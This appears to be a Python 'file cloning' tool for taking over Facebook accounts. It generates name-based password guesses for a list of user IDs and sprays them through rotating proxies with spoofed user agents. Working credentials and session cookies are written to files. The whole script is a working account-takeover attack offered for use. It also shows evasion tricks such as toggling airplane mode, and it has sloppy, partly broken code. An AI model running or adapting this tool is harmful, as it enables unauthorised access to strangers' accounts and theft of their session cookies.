
##-------------------𝗜𝗡𝗙𝗢------------------##
# 𝗗𝗲𝗰𝗼𝗱𝗲 𝗕𝘆 : 𝗔𝗡𝗔𝗦
# 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : Unknown 04X
# 𝗖𝗵𝗮𝗻𝗲𝗹𝗹 : ERROR_OFC_12

import os
import uuid
import mechanize
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
#os.system('pip install requests ')
#os.system('pip install mechanize ')
#os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
#os.system('pkg install espeak')
import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
from concurrent.futures import ThreadPoolExecutor as Ngangkang
from datetime import datetime
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import requests
import zlib
import platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
from concurrent.futures import ThreadPoolExecutor as Ngangkang
from datetime import datetime
####
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import httpx
pretty.install()
CON=sol()#=========User agent=========#
ua = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 Instagram 313.0.2.9.339 (iPhone12,8; iOS 16_6_1; pt_BR; pt; scale=2.00; 750x1334; 553462334)']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81']
ua = ['Mozilla/5.0 (Linux; Android 14; CPH2493 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBAV/445.0.0.35.117;FBBV/548375166;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/554572023]']

def tutulx(fx):
    tutulxz = '2023/2024'  # Default value
    if len(fx) == 15:
        if fx[:10] == '1000000000':
            tutulxz = '2009'
        elif fx[:9] == '100000000':
            tutulxz = '2009'
        elif fx[:8] == '10000000':
            tutulxz = '2009'
        elif fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            tutulxz = '2009'
        elif fx[:7] in ('1000006', '1000007', '1000008', '1000009'):
            tutulxz = '2010'
        elif fx[:6] == '100001':
            tutulxz = '2010/2011'
        elif fx[:6] in ('100002', '100003'):
            tutulxz = '2011/2012'
        elif fx[:6] == '100004':
            tutulxz = '2012/2013'
        elif fx[:6] in ('100005', '100006'):
            tutulxz = '2013/2014'
        elif fx[:6] in ('100007', '100008'):
            tutulxz = '2014/2015'
        elif fx[:6] == '100009':
            tutulxz = '2015'
        elif fx[:5] == '10001':
            tutulxz = '2015/2016'
        elif fx[:5] == '10002':
            tutulxz = '2016/2017'
        elif fx[:5] == '10003':
            tutulxz = '2018/2019'
        elif fx[:5] == '10004':
            tutulxz = '2019'
        elif fx[:5] == '10005':
            tutulxz = '2020'
        elif fx[:5] in ('10006', '10007', '10008'):
            tutulxz = '2021/2022'
        else:
            tutulxz = '2023'
    elif len(fx) in (9, 10):
        tutulxz = '2008/2009'
    elif len(fx) == 8:
        tutulxz = '2007/2008'
    elif len(fx) == 7:
        tutulxz = '2006/2007'
    
    return tutulxz

import os
import platform
import time
import sys

#class TUTUL:
#    def __init__(self, z):
#        for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)

sys.stdout.write('\x1b[1;37m\x1b]2; Rouk\x07')

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10.1.1; samsung a1 Build/POY47X)'
    b=['2','3','4','5','6','7','8','9','10','11','12','13','14','15']
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/587.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73, 100)
    i='0'
    j=random.randrange(4200, 4900)
    k=random.randrange(40, 150)
    l='Mobile Safari/537'
    uaku2=f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ COLOR STYLE ]---------- ###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[10;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[10;91m'
k = '\x1b[10;93m'
h = '\x1b[10;92m'
hh = '\x1b[32m'
u = '\x1b[10;95m'
kk = '\x1b[33m'
b = '\x1b[10;96m'
p = '\x1b[10;34m'
asu=random.choice([m,k,h,u,b])
    
def linex():
    print('\x1b[10;97m===============================================')

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    #-======------[ approval ]------=========]
#myid = uuid.uuid4().hex[:40].upper()
#idmy = uuid.uuid4().hex[:6].upper()
#generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'r').read()
#getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'w')
#getx.write(myid + idmy)
#getx.close()
#MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'r').read()

#class apvroval:
    
#    def check():
#        url = 'https://github.com/Ariyan-143/Tutul/blob/main/Tutul-Paid.txt'
#        import mechanize
#        my_awm = mechanize.Browser()
#        host = my_awm.open(url)
#        check_key = str(host.read())
#        if MY_KEY in check_key:
#            menu()
#            return None
#        None()
#        logo2 = f'''\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] {গোলাপিop}{MY_KEY}\x1b[0;92m'''
#        print(logo)
#        print(logo2)
#        print('\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] \x1b[10;93mFREE-FIRE-ID CLONING\n\x1b[10;97m[\x1b[92;1m•\x1b[10;97m] \x1b[10;92mONLY ACTIVE ID CLONING\n\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] \x1b[10;93mUnActive id Not Allow❌\n\x1b[10;97m[\x1b[92;1m•\x1b[10;97m]\x1b[10;92m Cp id Login 60%\n\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] \x1b[10;93mWi-fi Working 80%\x1b[10;97m')
#        input('\x1b[0;97m\x1b[10;97m[\x1b[92;1m●\x1b[10;97m]\x1b[10;92m PRESS ENTER TO SEND KEY\x1b[0;97m')
#        os.system('xdg-open https://wa.me/+8801611860222')
#        input('\x1b[0;97m\x1b[10;97m[\x1b[92;1m●\x1b[10;97m] \x1b[0;41mKEY COPY AND PRESS ENTER TO SEND ADMIN\x1b[0;97m')
#        os.system('xdg-open https://wa.me/+8801611860222')
#        time.sleep(59)
#        return None
#        if Exception:
#            e = None
#            print(e)
#            exit()
#            e = None
#            del e
#            return None
#        e = None
#        del e
#==========SCRIPT PASSWORD SYSTEM 🔑========]


#import getpass

#attemps = 0

#while attemps < 12345677901:
#    username = input(' \033[0;92mEnter Username: ')
#    password = input(' \033[0;93mEnter Password: ')

#    if username == 't': #and password == 'n':
#        print(' \033[0;92mYou Have Successfully Logged in.')
#        break
#    else:
#        print(' Incorrect Pass Please Trying ')
#        attemps += 1
#        continue
#os.system('clear')

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    os.system('python Tutul.16_7.py')
#def TUTULj(u):
#        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def contact():
#    os.system("xdg-open https://www.facebook.com/tanvirhasan444")
    back()
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#    os.system("xdg-open https://www.facebook.com/tanvirhasan444")
def animation2(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.0001)
def animation3(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
###=============LOGO======≠===##
logo=f'''
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m    ██████  \033[0;92m  ██████ \033[0;91m  ██    ██\033[0;92m  ██   ██     \033[0;92m║
║\033[0;91m    ██   ██ \033[0;92m ██    ██ \033[0;91m ██    ██ \033[0;92m ██  ██      \033[0;92m║
║\033[0;91m    ██████\033[0;92m  ██      ██\033[0;91m ██    ██\033[0;92m  █████       \033[0;92m║
║\033[0;91m    ██   ██ \033[0;92m ██    ██ \033[0;91m ██    ██\033[0;92m  ██  ██      \033[0;92m║
║\033[0;91m    ██   ██ \033[0;92m  ██████  \033[0;91m  ██████ \033[0;92m  ██   ██     \033[0;92m║
\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
\x1b[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;97m<\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m \x1b[0;91m\x1b[0;92m║
\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[34m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[33m╠══[Owner                    • TANVIR-HASAN ] ║
\x1b[31m╠══[Facebook                 • TANVIR HASAN ] ║
\x1b[33m╠══[VERSION                  • 1.1 ]          ║
\x1b[92m╠══[Key:\x1b[0;41mTUTUL KHANKHIR POLAR MARE CDI👉👌     \x1b[0;92m║
\x1b[34m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝'''
#os.system('clear')
#print(logo)
pass
#uname = input('\x1b[1;97m[\x1b[10;92m•\x1b[1;97m]\x1b[10;92m WHAT IS YOUR NAME \x1b[10;91m: \x1b[1;32m')
#os.system("clear")
#print(logo)
#os.system('espeak -a 300 " Welcome,to, Rouk,Tools"')
###----------------------MENU------------------#
def menu():
    os.system('clear')
    animation2(logo)
    animation("\x1b[10;31m[\x1b[10;97m•\x1b[10;31m] \x1b[0;93mTODAY'S DATE :\x1b[10;92m " + date)
    animation('\x1b[10;92m┏━\x1b[1;93m============================================')
    animation('\x1b[10;31m┣━\x1b[10;93m[\x1b[10;97m1\x1b[10;93m]\x1b[10;92m FILE CLONING')
    animation('\x1b[10;31m┣━\x1b[10;93m[\x1b[10;97m2\x1b[10;93m] \x1b[10;97mCONTACT WITH ADMIN')
    animation ('\x1b[10;31m┣━\x1b[10;93m[\x1b[10;97m0\x1b[10;93m] \x1b[1;91mEXIT ')
    animation('\x1b[10;92m┗━\x1b[1;93m============================================')
    ROUK = input('\x1b[10;92m\x1b[10;93m[\x1b[10;92m?\x1b[10;93m] \x1b[10;92mCHOOSE \x1b[10;91m:\x1b[10;92m ')
    time.sleep(0.01)
    if ROUK in ('1',):
        crack_file()
    elif ROUK in ('2', '02'):
        os.system('xdg-open https://wa.me/+8801616353478')
        os.system('python axe.py')
    elif ROUK in ('0',):
        exit()
    else:
        animation('\x1b[10;93m[\x1b[10;92m×\x1b[10;93m] \x1b[10;91mINPUT WRONG')
        time.sleep(2)
        back()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    os.system('clear')
    print(logo)
    #os.system('espeak -a 300 " your file name"')
    animation3('\x1b[1;32m\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] [EXAMPLE \x1b[10;91m: \x1b[10;92m/sdcard/file.txt  Etc...]')
    o = input('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m]\x1b[38;5;208m YOUR FILE NAME \x1b[10;91m:\x1b[10;92m ')
    try:lin = open(o).read().splitlines()
    except:
        animation2('\033[0;91m==================')
        animation2(' \x1b[10;93m[\x1b[10;92m\x1b[10;93m] \x1b[10;91mFile Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
        setting()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
    animation2('\x1b[10;91m=============================')
    animation3('\x1b[10;93m[\x1b[92;1m1\x1b[10;93m] \x1b[0;92mCLONING FOR ONLY OLD IDz')
    animation3('\x1b[10;93m[\x1b[92;1m2\x1b[10;93m] CLONING FOR ONLY NEW IDz')
    animation3('\x1b[10;93m[\x1b[92;1m3\x1b[10;93m] \x1b[0;92mCLONING FOR MIX IDz')
    animation2('\x1b[10;91m=============================')
    
    hu = input('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m  ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    l
    animation3('\x1b[10;91m==================')
    animation3('\x1b[10;93m[\x1b[92;1m1\x1b[10;93m] METHOD 1 [\x1b[10;92mCOOKIES SHOW\x1b[10;37m]')
    animation3('\x1b[10;91m==================')
    l
    hc = input('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m')
    if hc in ['1','01']:
        method.append('mobile')
    else:
        method.append('mobile')
    passwrd()
    exit() 

#==============PASSWORD LIST================#
def passwrd():
    os.system('clear')
    print(logo)
    animation('\x1b[10;93m===============================================')
    print('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m]\x1b[38;5;208m FUCK MARK ZUCKERBERG \x1b[10;91m :\x1b[10;96m ') #+ uname)
    print('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;92mTOTAL IDz :\x1b[10;93m ',str(len(id)))
    print('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m : \x1b[10;93m/sdcard/Rouk-Ok.txt')
    print('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;93m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;93m] \x1b[10;92mAFTER\x1b[10;91m-\x1b[10;92m3 MIN')
    animation('\x1b[10;93m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'1')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append('123456')
                    pwv.append('1234567')
                    pwv.append('12345678')
                    pwv.append('123456789')
                    pwv.append(nmf)
                    pwv.append('i love you')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'@#123')
                    pwv.append(frs+'@@##123')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11223')
                    pwv.append(frs+'2020')
                    pwv.append(frs+'2021')
                    pwv.append(frs+'2022')
                    pwv.append(frs+'2023')
                    pwv.append(frs+'2024')
                    pwv.append('@'+frs+'123')
                    pwv.append('@'+frs+'1122')
                    pwv.append('@'+frs+'@')
                    pwv.append('@'+frs+'#')
                    pwv.append('@'+frs+'@123')
                    pwv.append('@@'+frs+'@@')
                    pwv.append('@'+frs+'@2211')
                    pwv.append('@'+frs+'@1122')
                    pwv.append(frs+'@2020')
                    pwv.append(frs+'@2021')
                    pwv.append(frs+'@2022')
                    pwv.append(frs+'@2023')
                    pwv.append(frs+'@2024')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'1')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append('123456')
                    pwv.append('1234567')
                    pwv.append('12345678')
                    pwv.append('123456789')
                    pwv.append(nmf)
                    pwv.append('i love you')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'@#123')
                    pwv.append(frs+'@@##123')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11223')
                    pwv.append(frs+'2020')
                    pwv.append(frs+'2021')
                    pwv.append(frs+'2022')
                    pwv.append(frs+'2023')
                    pwv.append(frs+'2024')
                    pwv.append('@'+frs+'123')
                    pwv.append('@'+frs+'1122')
                    pwv.append('@'+frs+'@')
                    pwv.append('@'+frs+'#')
                    pwv.append('@'+frs+'@123')
                    pwv.append('@@'+frs+'@@')
                    pwv.append('@'+frs+'@2211')
                    pwv.append('@'+frs+'@1122')
                    pwv.append(frs+'@2020')
                    pwv.append(frs+'@2021')
                    pwv.append(frs+'@2022')
                    pwv.append(frs+'@2023')
                    pwv.append(frs+'@2024')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
                
    print('')
    animation('\n\x1b[10;93m[\x1b[10;92m•\x1b[10;93m]============================================')
    animation('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;96mCLONING COMPLETE BRO')
    animation(f'''\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;92mCOMPLETE YOUR TOTAL OK IDz \x1b[10;91m:\x1b[10;92m {h}%s ''' % ok)
    animation('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m]============================================')
    woi = input('\x1b[10;93m[\x1b[10;92m•\x1b[10;93m] \x1b[10;91mCLICK ENTER TO EXIT ')
    os.system("python axe.py")
    exit()

#================[ HOST-METHOD]======≠====#
def crack(idf,pwv):
    global cp,ok,loop
    bo = random.choice([m,k,h,b,u,x])
    (sys.stdout.write(f'''\r\x1b[10;93m[\x1b[10;92m•\x1b[10;93m]\x1b[10;91m~\x1b[10;93m[{bo}Rouk\x1b[10;93m]\x1b[1;90m>~{P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}-{P}[{h}Ok{P}-{bo}{ok}{P}] '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://'+nip}
            ses.headers.update({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://m.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie':koki},headers=heade,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'''\r\x1b[10;93m[\x1b[10;92m=\x1b[10;93m]\x1b[10;91m~\x1b[10;95m[Rouk-Cp😔] {idf} | {pw}''')
                open('/sdcard/Rouk-Cp-id.txt','a').write(idf+' | '+pw+'\n')
                akun.append(idf+' | '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                bo = random.choice([m,k,h,b,u,x])
                print(f'''\r\x1b[10;92m[Rouk-Ok💚] {idf} | {pw} \x1b[10;91m:> \x1b[10;96m{tutulx(idf)}\n\x1b[10;93m[🌺] = COOKIES\x1b[10;91m : \x1b[10;94m{kuki}''')
                linex()
                open('/sdcard/Rouk-Ok-id.txt','a').write(idf+' | '+pw+'\n[COOKIES] = '+kuki+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()